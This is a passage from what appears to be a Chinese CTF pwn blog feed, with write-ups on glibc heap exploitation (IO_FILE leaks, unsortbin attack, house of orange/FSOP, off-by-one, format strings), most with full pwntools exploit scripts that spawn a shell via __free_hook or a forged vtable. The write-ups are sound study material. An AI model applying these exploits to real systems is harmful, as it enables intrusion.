rm(i)</code></pre><p>利用chunk(9)来修改chunk(10)的pre_size，然后free(7),free(10)，从而使得7–&gt;10进行合并，之后可以切割unsortbin来进行泄露。</p><p><img src="https://i.loli.net/2021/10/27/8fvnKSTLab9ZCw6.png"></p><pre><code>md(9, &#39;A&#39; * 0x70 + p64(0x90 + 0x80 + 0x80) + &#39;\x90&#39;)rm(9)rm(10)ad(0, 0x60) ad(1, 0x10) dp(8)leak = u64(ru(&#39;\x7f&#39;)[-5:] + &#39;\x7f\x00\x00&#39;)libc_base = leak  - libc.sym[&#39;__malloc_hook&#39;] - 96 - 0x10</code></pre><p>由于之前我们的chunk结构，所以我们选择在chunk(8),chunk(9)进行写入unsortbin。<br>因为chunk(8)的大小为0x78，为了溢出至chunk(9)，我们需要malloc一个大chunk,从而可以修改到chunk(9)的FD</p><p>malloc后，往该堆填入数据直到chunk(9)的FD,写入__free_hook.</p><pre><code>ad(2,0xa0)payload = b&#39;B&#39;*0x80 + p64(__free_hook)+ p64(0) + b&#39;\n&#39;md(2,payload)#gdb.attach(io)ad(4,0x70)md(4,&#39;/bin/sh\x00\n&#39;)ad(5,0x70)md(5,p64(system)+b&#39;\n&#39;)rm(4)</code></pre><p>之后就按照流程进入system即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwnpwn&quot;&gt;&lt;a href=&quot;#pwnpwn&quot; class=&quot;headerlink&quot; title=&quot;pwnpwn&quot;&gt;&lt;/a&gt;pwnpwn&lt;/h1&gt;&lt;p&gt;简单的格式化字符串漏洞由于程序本身会打印一个当前地址，只需要减去当前函数的偏移即可获取elf基地址&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十月一日-CTF-PWN</title>
    <link href="http://example.com/2021/10/03/10.1/"/>
    <id>http://example.com/2021/10/03/10.1/</id>
    <published>2021-10-03T07:18:43.410Z</published>
    <updated>2021-10-18T17:02:15.604Z</updated>
    
    <content type="html"><![CDATA[<h1 id="十月一日总结-PWN"><a href="#十月一日总结-PWN" class="headerlink" title="十月一日总结-PWN"></a>十月一日总结-PWN</h1><h2 id="IO-FILE泄露glibc"><a href="#IO-FILE泄露glibc" class="headerlink" title="IO_FILE泄露glibc"></a>IO_FILE泄露glibc</h2><p><a href="https://www.lshykx.fun/posts/8601552c/">IO_FILE泄露libc参考文章</a></p><p>首先利用工具查出libc版本，可以看出这是glibc_2.27</p><p><img src="https://i.loli.net/2021/10/03/Tu7vNH5gtBxsnJl.png"></p><p>经过尝试，发现存在double_free漏洞，考虑到没有开启地址随机化保护，而且没有show函数，我们考虑通过IO_FILE泄露libc,</p><pre><code>0x602080 &lt;stdout@@GLIBC_2.2.5&gt;:    0x00007f87b2616161    0x00000000000000000x602090 &lt;stdin@@GLIBC_2.2.5&gt; :    0x00007f87b21eda00    0x00000000000000000x6020a0 &lt;stderr@@GLIBC_2.2.5&gt;:    0x00007f87b21ee680    0x0000000000000000</code></pre><p><img src="https://i.loli.net/2021/10/03/grLcyo4JmhApZUE.png"></p><p>因为&lt;stdout@@GLIBC_2.2.5&gt;:    0x00007fd54dc2a760 这个指针指向被认为了fd所以再次malloc时将从0x00007fd54dc2a760处取得。而我们正好可以修改_IO_2_1_stdout_来实现泄露libc</p><p><img src="https://i.loli.net/2021/10/03/oFCYxjnBT4zbMhp.png"></p><pre><code>payload=p64(0xfdab1800)+p64(0)*3+b&#39;\x00&#39;add(0x60,payload)leak_vtable=u64(io.recvuntil(&quot;exit&quot;)[0x58:0x60])libc_base=leak_vtable-libc.symbols[&quot;_IO_file_jumps&quot;]</code></pre><p>最后再次利用double_free实现get_shell</p><pre><code>add(0x70,&quot;aaa&quot;)dele(5)dele(5)add(0x70,p64(free_hook))add(0x70,b&quot;/bin/sh\x00&quot;)add(0x70,p64(system))#gdb.attach(io)dele(7)</code></pre><p><img src="https://i.loli.net/2021/10/03/qz83b5SKvuaBH2D.png"></p><p>最后exp如下：</p><pre><code>#! /usr/bin/python3from pwn import *io = process(&#39;./IO_FILE&#39;)elf = ELF(&#39;./IO_FILE&#39;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &#39;debug&#39;def add (size,des):   io.sendlineafter(&quot;&gt;&quot;,&#39;1&#39;)   io.sendlineafter(&quot;size:&quot;,str(size))   io.sendafter(&quot;ion:&quot;,des)def dele(idx):   io.sendlineafter(&quot;&gt;&quot;,&#39;2&#39;)   io.sendlineafter(&quot;index:&quot;,str(idx))add(0x60,&#39;aaa&#39;)dele(0)dele(0)add(0x60,p64(0x602080))add(0x60,b&#39;\x60&#39;)add(0x60,b&#39;\x60&#39;)payload=p64(0xfdab1800)+p64(0)*3+b&#39;\x00&#39;add(0x60,payload)gdb.attach(io)leak_vtable=u64(io.recvuntil(&quot;exit&quot;)[0x58:0x60])libc_base=leak_vtable-libc.symbols[&quot;_IO_file_jumps&quot;]free_hook=libc_base+libc.symbols[&quot;__free_hook&quot;]system=libc_base+libc.symbols[&quot;system&quot;]print(&quot;leak_vtable---&gt;&quot;+hex(leak_vtable))print(&quot;libc_base-----&gt;&quot;+hex(libc_base))print(&quot;free_hook-----&gt;&quot;+hex(free_hook))print(&quot;system--------&gt;&quot;+hex(system))add(0x70,&quot;aaa&quot;)dele(5)dele(5)add(0x70,p64(free_hook))add(0x70,b&quot;/bin/sh\x00&quot;)add(0x70,p64(system))#gdb.attach(io)dele(7)io.interactive()</code></pre><h2 id="长安杯2-27下的unsortbin-attack"><a href="#长安杯2-27下的unsortbin-attack" class="headerlink" title="长安杯2.27下的unsortbin_attack"></a>长安杯2.27下的unsortbin_attack</h2><pre><code>int creat()&#123;  unsigned int id; // [rsp+0h] [rbp-10h]  int nbytes; // [rsp+4h] [rbp-Ch]  void *content; // [rsp+8h] [rbp-8h]  puts(&quot;idx?&quot;);  id = read_0x10();  if ( id &gt; 0xF )    return puts(&quot;error!&quot;);  puts(&quot;size?&quot;);  nbytes = read_0x10();  size_202060[id] = nbytes;  if ( nbytes &gt; 0x400 )    return puts(&quot;error!&quot;);  content = malloc(nbytes);  if ( !content )    return puts(&quot;error!&quot;);  *(&amp;arr_2020E0 + id) = content;  puts(&quot;content?&quot;);  read(0, *(&amp;arr_2020E0 + id), nbytes);  return puts(&quot;success!&quot;);&#125;</code></pre><p>漏洞出现在这里，分析逻辑可以发现，程序运行时是先将size写入，之后才判断大小，因此存在漏洞，我们可以利用这里来进行泄露。</p><p>我们发现这里没有重复创建堆的判断，因此可以直接创建两个相同的堆。从而达到修改size的目的。</p><p>在首个unsortbin的fd中，存储这mainarea+96,而且其附近(-0x10)就是__malloc_hook，所以我们可以利用其泄露地址。</p><pre><code>creat(7,0x80,&#39;c&#39;*0x80)creat(7,0x500,&#39;D&#39;)edit (7,0x450,&#39;D&#39;*0x90)show (7)#gdb.attach(io)leak = u64(io.recvuntil(&#39;\x7f&#39;,drop = True)[-5:] + b&#39;\x7f\x00\x00&#39;)libc_base = leak - libc.sym[&#39;__malloc_hook&#39;] - 96 - 0x10</code></pre><p>最后修改__free_hook为system并将参数设置为/bin/sh\x00，最最后free即可。</p><p><img src="https://i.loli.net/2021/10/03/avfnj2NebSgWm6i.png"></p><pre><code>delet(0)delet(1)delet(2)delet(8)edit(7, 0x400, b&#39;A&#39; * (0x80) + p64(0) + p64(0x91) + p64(libc_base + libc.sym[&#39;__free_hook&#39;]))creat(0, 0x80, b&#39;/bin/sh\x00&#39;)#gdb.attach(io)creat(1, 0x80, p64(libc_base + libc.sym[&#39;system&#39;]))delet(0)</code></pre><p>exp如下</p><pre><code>#! /usr/bin/python3from pwn import *#io = process(&#39;./main&#39;)io = remote(&quot;113.201.14.253&quot;,21111)elf = ELF(&#39;./main&#39;)libc = ELF(&#39;./libc-2.27.so&#39;)#libc = ELF(&#39;/glibc/2.29/64/lib/libc.so.6&#39;)context.log_level = &#39;debug&#39;import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)#----------functiondef creat(idx, sz, d):    io.sendlineafter(&#39;&gt;&gt;&#39;, &#39;1&#39;)    io.sendlineafter(&#39;?&#39;, str(idx))    io.sendlineafter(&#39;?&#39;, str(sz))    if(sz &lt;= 0x400):        io.sendafter(&#39;?&#39;, d)def ad(idx, sz, d):    sla(&#39;&gt;&gt;&#39;, &#39;1&#39;)    sla(&#39;?&#39;, str(idx))    sla(&#39;?&#39;, str(sz))    if(sz &lt;= 0x400):        sa(&#39;?&#39;, d)def delet (idx):    sla(&#39;&gt;&gt;&#39;, &#39;2&#39;)    sla(&#39;?&#39;, str(idx))def edit (idx,size,content):    sla(&#39;&gt;&gt;&#39;, &#39;3&#39;)    sla(&#39;?&#39;, str(idx))    sla(&#39;?&#39;, str(size))    sa(&#39;?&#39;, content)def show (idx):    sla(&#39;&gt;&gt;&#39;, &#39;4&#39;)    sla(&#39;?&#39;, str(idx))#---------------for i in range(9):    ad(i, 0x80, &#39;A&#39; * 0x80)for i in range(7):   delet(6-i)delet(7)for i in range(6):   ad(i, 0x80, &#39;A&#39; * 0x80)creat(7,0x80,&#39;c&#39;*0x80)creat(7,0x500,&#39;D&#39;)edit (7,0x450,&#39;D&#39;*0x90)show (7)#gdb.attach(io)leak = u64(io.recvuntil(&#39;\x7f&#39;,drop = True)[-5:] + b&#39;\x7f\x00\x00&#39;)libc_base = leak - libc.sym[&#39;__malloc_hook&#39;] - 96 - 0x10free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]print(&quot;leak-------&gt;&quot;+hex(leak))print(&quot;libc_base--&gt;&quot;+hex(libc_base))print(&quot;free_hook--&gt;&quot;+hex(free_hook))gdb.attach(io)edit (7, 0x400, b&#39;A&#39; * (0x80) + p64(0) + p64(0x91))#gdb.attach(io)creat(8, 0x80, &#39;A&#39; * 0x80)delet(0)delet(1)delet(2)delet(8)edit(7, 0x400, b&#39;A&#39; * (0x80) + p64(0) + p64(0x91) + p64(libc_base + libc.sym[&#39;__free_hook&#39;]))creat(0, 0x80, b&#39;/bin/sh\x00&#39;)#gdb.attach(io)creat(1, 0x80, p64(libc_base + libc.sym[&#39;system&#39;]))delet(0)io.interactive()io.close()</code></pre><h2 id="电信杯2-31unsortbin-attachk"><a href="#电信杯2-31unsortbin-attachk" class="headerlink" title="电信杯2.31unsortbin_attachk"></a>电信杯2.31unsortbin_attachk</h2><p>观察代码，漏洞已经很明显了，使用gets函数导致了可以溢出</p><pre><code>int __fastcall creat(__int64 a1)&#123;  unsigned int i; // [rsp+4h] [rbp-Ch]  void *v3; // [rsp+8h] [rbp-8h]  for ( i = 0; i &lt;= 0x1F &amp;&amp; qword_4060[i]; ++i )    ;  if ( i == 32 )    ((void (__fastcall *)(__int64))sub_12F8)(a1);  v3 = malloc(0x80uLL);  if ( !v3 )  &#123;    puts(&quot;malloc error&quot;);    exit(1);  &#125;  printf(&quot;content: &quot;);  gets(v3);  qword_4060[i] = v3;  return puts(&quot;done&quot;);&#125;</code></pre><p>考虑到我们需要使用unsortbin_attack，但是只能malloc 0x80的chunk,所以需要修改size&gt;0x440,使得其free后可以进入unsortbin。</p><pre><code>delet(0)creat(b&quot;a&quot;*0x88 + p64(0x90*9+1))delet(1)creat(&quot;A&quot;)show(2)#fd =    u64(io.recvuntil(&quot;\x7f&quot;)[-6:]+b&#39;\x00\x00&#39;)leak = u64(io.recvuntil(&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)</code></pre><p>此时我们完成了泄露，只需将__free_hook修改为system,参数设置为/bin/sh\x00,然后free即可</p><pre><code>delet(6)delet(5)delet(4)creat(b&quot;a&quot;*0x88 + p64(0x91) + p64(libc.sym[&#39;__free_hook&#39;]))creat(&quot;B&quot;)creat(p64(system_addre))delet(10)</code></pre><p>之前写的比较详细了，这里不在多讲。</p><p>exp如下：</p><pre><code>#! /usr/bin/python3from pwn import *elf = ELF(&#39;./pwn1&#39;)libc = ELF(&#39;/glibc/2.30/64/lib/libc.so.6&#39;)context.log_level = &#39;debug&#39;io = process(&#39;./pwn1&#39;)def creat(data):   io.sendlineafter(&quot;&gt;&gt; &quot;,&#39;1&#39;)   io.sendlineafter(&quot;content: &quot;,data)def show(idx):   io.sendlineafter(&quot;&gt;&gt; &quot;,&#39;3&#39;)   io.sendlineafter(&quot;index: &quot;,str(idx))def delet(idx):   io.sendlineafter(&quot;&gt;&gt; &quot;,&#39;2&#39;)   io.sendlineafter(&quot;index: &quot;,str(idx))for i in range(12): #0-12   creat(b&quot;/bin/sh\x00&quot;)delet(0)creat(b&quot;a&quot;*0x88 + p64(0x90*9+1))delet(1)creat(&quot;A&quot;)show(2)#fd =    u64(io.recvuntil(&quot;\x7f&quot;)[-6:]+b&#39;\x00\x00&#39;)leak = u64(io.recvuntil(&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)print(&quot;leak------&gt;&quot;+hex(leak))libc_base = leak - 96 - 0x10 - libc.sym[&#39;__malloc_hook&#39;]print(&quot;libc_base-&gt;&quot;,hex(libc_base))libc.address = libc_basesystem_addre = libc.sym[&#39;system&#39;]delet(6)delet(5)delet(4)creat(b&quot;a&quot;*0x88 + p64(0x91) + p64(libc.sym[&#39;__free_hook&#39;]))creat(&quot;B&quot;)creat(p64(system_addre))delet(10)io.interactive()</code></pre><h2 id="house-Of-orange"><a href="#house-Of-orange" class="headerlink" title="house_Of_orange"></a>house_Of_orange</h2><p>本题需要利用house_of_orange获得free_chunk , 然后再利用FSOP劫持程序执行流。</p><p>分析程序可以发现，在upgrade函数中会重新获取name的大小，因此这里存在溢出漏洞</p><p><img src="https://i.loli.net/2021/10/18/2aQENgxkKwc1U3A.png"></p><p>然而，本程序并没有free功能，因此引出了house_of_orange技术。</p><p>可以通过溢出来修改top_chunk的size域，然后malloc一个大堆块，使得系统调用sysmalloc，</p><p>如果所需分配的 chunk 大小大于 mmap 分配阈值（默认为 128K，0x20000），就会调用mmap。<br>然后top_chunk就会进入unsorted bin ， 从而实现free的功能。</p><p>那么我们如何劫持程序流呢？这里就引出了FSOP</p><p>在libc的_IO_list_all中，存放有一个_IO_FILE_plus结构体的指针，<br>如下图，它指向_IO_2_1_stderr_：</p><p><img src="https://img-blog.csdnimg.cn/20200427101745159.png"></p><p>而_IO_FILE_plus结构体详细内容如下</p><p><img src="https://img-blog.csdnimg.cn/20200427101902924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE0NTgyMA==,size_16,color_FFFFFF,t_70"></p><p>其中_chain指向下一个_IO_FILE_plus结构体</p><p>在malloc中，它调用malloc_printerr来打印错误，经过一系列调用，最终来到_IO_flush_all_lockp：</p><pre><code>while (fp != NULL)&#123;…    fp = fp-&gt;_chain;    ...          if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T       || (_IO_vtable_offset (fp) == 0           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif       )      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</code></pre><p>如果满足以下条件：</p><pre><code>fp-&gt;_mode &gt; 0_IO_vtable_offset (fp) == 0fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></pre><p>因此可以伪造一个_IO_FILE_plus , 从而满足这些条件</p><p>1.创建一个chunk,并溢出修改top_chunk的size . 使top_chunk满足house_of_orange的条件</p><p>2.malloc一个大堆块，使得调用sysmalloc 并使得top_chunk进入unsorted bin ，然后再malloc一个chunk，这是为了切割top_chunk，使其信息残留在新的chunk中，从而泄露地址。之后show()，计算出__malloc_hook 即可。</p><p><img src="https://i.loli.net/2021/10/18/6lxZ7uKOAzIYVhC.png"></p><p>3.</p><p>为了再次泄露出堆的地址，我们再次编辑堆，然后show泄露残留的信息（fd,bk）,并通过偏移计算出heap_base</p><p><img src="https://i.loli.net/2021/10/18/39qYpynl18wKOmQ.png"></p><p>4.之后伪造_IO_FILE_plus和一个fake_chuk</p><pre><code>payload = b&#39;a&#39; * 0x400 + p64(0) + p64(0x21) + p64(0) + p64(0)fake_file = b&#39;/bin/sh\x00&#39;+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)  fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,b&#39;\x00&#39;)fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload, 666, 2)</code></pre><p>溢出修改堆并使其原top_chunk作为 fake_IO_FILE_plus</p><p><img src="https://i.loli.net/2021/10/18/E5CP8vYewWcpK7u.png"></p><p>再次malloc，触发错误，获得shell<br>malloc时，对unsorted bin进行判断，此时该chunk的size为0x61，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58<br>此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误<br>此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体</p><p><img src="https://i.loli.net/2021/10/18/3h8UAgDJ6t5OWcM.gif"></p><p>在构造出smal bin的时候</p><p>small bin的头节点会储存在main_arena中</p><p>控制大小为0x60的时候，刚好头部地址储存对应 chain这个位置</p><p>EXP :</p><pre><code>#! /usr/bin/python3from pwn import *from LibcSearcher import *#r = remote(&quot;node4.buuoj.cn&quot;,29449)r = process(&quot;./houseoforange_hitcon_2016&quot;)context.log_level = &#39;debug&#39;elf = ELF(&quot;./houseoforange_hitcon_2016&quot;)libc = elf.libcdef add(size, content, price, color):    r.recvuntil(&quot;Your choice : &quot;)    r.sendline(&#39;1&#39;)    r.recvuntil(&quot;Length of name :&quot;)    r.sendline(str(size))    r.recvuntil(&quot;Name :&quot;)    r.send(content)    r.recvuntil(&quot;Price of Orange:&quot;)    r.sendline(str(price))    r.recvuntil(&quot;Color of Orange:&quot;)    #1-7    r.sendline(str(color))def show():    r.recvuntil(&quot;Your choice : &quot;)    r.sendline(&#39;2&#39;)def edit(size, content, price, color):    r.recvuntil(&quot;Your choice : &quot;)    r.sendline(&#39;3&#39;)    r.recvuntil(&quot;Length of name :&quot;)    r.sendline(str(size))    r.recvuntil(&quot;Name:&quot;)    r.send(content)    r.recvuntil(&quot;Price of Orange:&quot;)    r.sendline(str(price))    r.recvuntil(&quot;Color of Orange:&quot;)    #1-7    r.sendline(str(color))add(0x30,&#39;aaaa\n&#39;,0x1234,0xddaa)payload = b&#39;a&#39; * 0x30 +p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0) * 2 + p64(0xf81)edit(len(payload), payload, 666, 0xddaa)add(0x1000, &#39;a\n&#39;,0x1234, 0xddaa)add(0x400, &#39;a&#39; * 8, 199, 2)show()r.recvuntil(&#39;a&#39;*8)malloc_hook = u64(r.recvuntil(&#39;\x7f&#39;).ljust(8, b&#39;\x00&#39;)) - 0x668 - 0x10success(&#39;malloc_hook = &#39;+hex(malloc_hook))libc.address = malloc_hook - libc.symbols[&#39;__malloc_hook&#39;]io_list_all = libc.symbols[&#39;_IO_list_all&#39;]system = libc.symbols[&#39;system&#39;]print(&quot;libc.address--&gt;&quot;,hex(libc.address))print(&quot;io_list_all---&gt;&quot;,hex(io_list_all))print(&quot;system--------&gt;&quot;,hex(system))payload = &#39;b&#39; * 0x10edit(0x10, payload, 199, 2)show()r.recvuntil(&#39;b&#39;*0x10)heap = u64(r.recvuntil(&#39;\n&#39;).strip().ljust(8, b&#39;\x00&#39;))heap_base = heap - 0xE0success(&#39;heap = &#39;+hex(heap))#pause()payload = b&#39;a&#39; * 0x400 + p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0)fake_file = b&#39;/bin/sh\x00&#39;+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,b&#39;\x00&#39;)fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload, 666, 2)#pause()r.recvuntil(&quot;Your choice : &quot;)r.sendline(&#39;1&#39;)r.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;十月一日总结-PWN&quot;&gt;&lt;a href=&quot;#十月一日总结-PWN&quot; class=&quot;headerlink&quot; title=&quot;十月一日总结-PWN&quot;&gt;&lt;/a&gt;十月一日总结-PWN&lt;/h1&gt;&lt;h2 id=&quot;IO-FILE泄露glibc&quot;&gt;&lt;a href=&quot;#IO-FILE</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ctf-wiki</title>
    <link href="http://example.com/2021/09/24/ctf-wiki/"/>
    <id>http://example.com/2021/09/24/ctf-wiki/</id>
    <published>2021-09-24T06:44:56.985Z</published>
    <updated>2021-09-24T06:49:36.303Z</updated>
    
    <content type="html"><![CDATA[<p>#ctf-wiki</p><p>##off-by-one</p><p>1-只能修改一个字节，溢出可控字节，通过修改堆块大小造成堆重叠从而覆盖或泄露其他数据。</p><p>2-溢出NULL字节可以使prev_inuse位被清0，前块会被认为是free块，从而造成堆重叠。</p><p>下面以该题作为演示</p><p>Asis CTF 2016 b00ks</p><pre><code>__int64 __fastcall over_one(_BYTE *chunk, int size)&#123;  int i; // [rsp+14h] [rbp-Ch]  if ( size &lt;= 0 )    return 0LL;  for ( i = 0; ; ++i )  &#123;    if ( read(0, chunk, 1uLL) != 1 )      return 1LL;    if ( *chunk == 10 )      break;    ++chunk;    if ( i == size )      break;  &#125;  *chunk = 0;  return 0LL;&#125;</code></pre><p>这里最后有NULL溢出。</p><pre><code>.data:0000000000202010 chunk_array     dq offset unk_202060    ; DATA XREF: find_temp:loc_B38↑o.data:0000000000202010                                         ; delet:loc_C1B↑o ....data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: change+15↑o</code></pre><p>这里可以发现off_202018（author）与chunk_array只相差了0x20个字，因此我们可以写入0x20个字符，然后打印溢出chunk_array所存储的地址。</p><p>关键的地方来了，我们可以通过适当的调整size大小，使得prt_des的后两位正好是00，然后再修改author，使得chunk_array【0】指向了ptr_des。若此时我们再在des中伪造了一个结构体,并使chunk_array可以索引到book2,这样就形成了堆重叠。可以分配edit book1 ，book2来修改free_hook。</p><p>那么我们先create两个book,经过调试发现，当name_size为0x20时ptr_des的位置符合需求。而第二个book有通过vmmap泄露libc_base 的功能，所以需要很大的空间，使系统单独映射一段内存从而泄露libc</p><p>1.首先通过填满author泄露chunk_array【1】所存储的struct_book1 的地址。</p><p><img src="https://i.loli.net/2021/09/24/f84RvlpVqoTgK2B.png"></p><p>2.在book1的des段填充数据使其存储book2的ptr_name ptr_des</p><p>3.然后通过打印泄露出book2的各种地址</p><p>4.之后再次填充author使得chunk_array【1】指向了book1的des段。</p><p>5.最后edit_book1写入free_hook,再edit_book2写入one_gadget,然后执行free函数即可get_shell</p><p><img src="https://i.loli.net/2021/09/24/UawSy1PYnF47cbT.png"></p><p>调试libc偏移</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#ctf-wiki&lt;/p&gt;
&lt;p&gt;##off-by-one&lt;/p&gt;
&lt;p&gt;1-只能修改一个字节，溢出可控字节，通过修改堆块大小造成堆重叠从而覆盖或泄露其他数据。&lt;/p&gt;
&lt;p&gt;2-溢出NULL字节可以使prev_inuse位被清0，前块会被认为是free块，从而造成堆重叠。</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>buuctf&amp;&amp;攻防世界2</title>
    <link href="http://example.com/2021/08/04/A%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn(2)/"/>
    <id>http://example.com/2021/08/04/A%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn(2)/</id>
    <published>2021-08-04T15:23:31.656Z</published>
    <updated>2021-10-27T14:39:24.123Z</updated>
    
    <content type="html"><![CDATA[<p>#pwn进阶区</p><p>##greeting-150</p><p>这是个明显的字符串漏洞</p><pre><code>return printf(s);</code></pre><p>思路就是修改strlen函数为system，并且让函数循环执行，从而getshell</p><p>在程序末尾会执行fini函数，我们将其修改为start_addr</p><p>我们先输入aaaa%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p来观察输入的字符串在第几个参数</p><p><img src="https://i.loli.net/2021/08/16/dATjuN5JnUmr92e.png"></p><p>由上图可知，只需对齐2字节，那么下一个参数就出现在第12个。</p><p>首先修改strlen_got的高字节（因为它比较小），那么修改的大小是<br>0x804 - (len(‘aa’) + len(‘Nice to meet you, ‘) + 4 * 4) = 2016</p><p>fini_got的高字节相同</p><p>然后分别是strlen_got的低字节和fini_got的低字节（因为system的低字节更小）</p><p>最后传入”/bin/sh”即可</p><p>##babyfengshui</p><p>有四个功能如下：</p><p><img src="https://i.loli.net/2021/08/04/71OHyQxLjbqusNa.gif"></p><p>其中add_usr的功能：</p><p><img src="https://i.loli.net/2021/08/04/b7yZDnAQxMwaSs2.gif"></p><pre><code>  p_discri = malloc(size);    //用于存放discription堆  memset(p_discri, 0, size);  v3 = malloc(0x80u);         //用于存放name堆  memset(v3, 0, 0x80u);  *v3 = p_discri;             //将discription堆的地址存放到name堆的首地址  *(&amp;array + num) = v3;       //将name堆的地址存放到数组  printf(&quot;name: &quot;);  fgets_addr_len(*(&amp;array + num) + 4, 124);  //向discription堆中写入  puts_text(num++);  return v3;</code></pre><p>所以add_usr一次会创建两个堆，并且会将name堆写入数组。</p><p>一下是Update a user description功能</p><pre><code>v3 = 0;printf(&quot;text length: &quot;);__isoc99_scanf(&quot;%u%c&quot;, &amp;v3, &amp;v2);if ( (v3 + **(&amp;array + num_next)) &gt;= *(&amp;array + num_next) - 4 )&#123;  puts(&quot;my l33t defenses cannot be fooled, cya!&quot;);  exit(1);&#125;printf(&quot;text: &quot;);fgets_addr_len(**(&amp;array + num_next), v3 + 1);</code></pre><p>if ( (v3 + **(&amp;array + num_next)) &gt;= *(&amp;array + num_next) - 4 )</p><p>这句当len &gt;= name_addr - discri_addr 时报错。这里默认了创建堆是连续的，然而通过我们的构造，可以让name堆 和 discription堆相隔很远，从而产生溢出。</p><p>先申请3个usr,并在3号usr的discription中写入”/bin/sh\x00”</p><pre><code>add_user(0x80,0x80,&quot;AAAA&quot;)            #0add_user(0x80,0x80,&quot;BBBB&quot;)            #1add_user(0x8,0x8,&quot;/bin/sh\x00&quot;)       #2</code></pre><p>之后dele_0号这是两个堆合并成为大小为0x100的chunk</p><pre><code>delete_user(0)add_user(0x100,0x19c,b&#39;D&#39;*(0x198) + p32(elf.got[&#39;free&#39;]))          #3</code></pre><p>溢出1号usr的discription为elf.got[‘free’]</p><pre><code>display_user(1)p.recvuntil(&quot;description: &quot;)free_addr = u32(p.recv(4))print(&quot;free_addr&quot;,hex(free_addr))libc = LibcSearcher(&#39;free&#39;,free_addr)libc_base = free_addr - libc.dump(&#39;free&#39;)system_addr = libc_base + libc.dump(&#39;system&#39;)</code></pre><p>泄露地址，并寻找system_addr</p><pre><code>printf(&quot;text: &quot;);fgets_addr_len(**(&amp;array + num_next), v3 + 1);</code></pre><p>利用Update a user description功能，向**(&amp;array + num_next)及elf.got[‘free’]存储的内容写入system.之后free_usr_1即可get_shell</p><pre><code>#!/usr/bin/python3from pwn import *from LibcSearcher import *p=remote(&#39;111.200.241.244&#39;,51565)elf=ELF(&#39;./babyfengshui&#39;)#context.log_level = &#39;debug&#39;#p = process(&#39;./babyfengshui&#39;)libc=ELF(&#39;./libc.so.6&#39;)def add_user(size, length, text):    p.sendlineafter(&quot;Action: &quot;, &#39;0&#39;)    p.sendlineafter(&quot;description: &quot;, str(size))    p.sendlineafter(&quot;name: &quot;, &#39;AAAA&#39;)    p.sendlineafter(&quot;length: &quot;, str(length))    p.sendlineafter(&quot;text: &quot;, text)def delete_user(idx):    p.sendlineafter(&quot;Action: &quot;, &#39;1&#39;)    p.sendlineafter(&quot;index: &quot;, str(idx))def display_user(idx):    p.sendlineafter(&quot;Action: &quot;, &#39;2&#39;)    p.sendlineafter(&quot;index: &quot;, str(idx))def update_desc(idx, length, text):    p.sendlineafter(&quot;Action: &quot;, &#39;3&#39;)    p.sendlineafter(&quot;index: &quot;, str(idx))    p.sendlineafter(&quot;length: &quot;, str(length))    p.sendlineafter(&quot;text: &quot;, text)add_user(0x80,0x80,&quot;AAAA&quot;)            #0add_user(0x80,0x80,&quot;BBBB&quot;)            #1add_user(0x8,0x8,&quot;/bin/sh\x00&quot;)       #2delete_user(0)add_user(0x100,0x19c,b&#39;D&#39;*(0x198) + p32(elf.got[&#39;free&#39;]))          #3#gdb.attach(p)display_user(1)p.recvuntil(&quot;description: &quot;)free_addr = u32(p.recv(4))print(&quot;free_addr&quot;,hex(free_addr))libc = 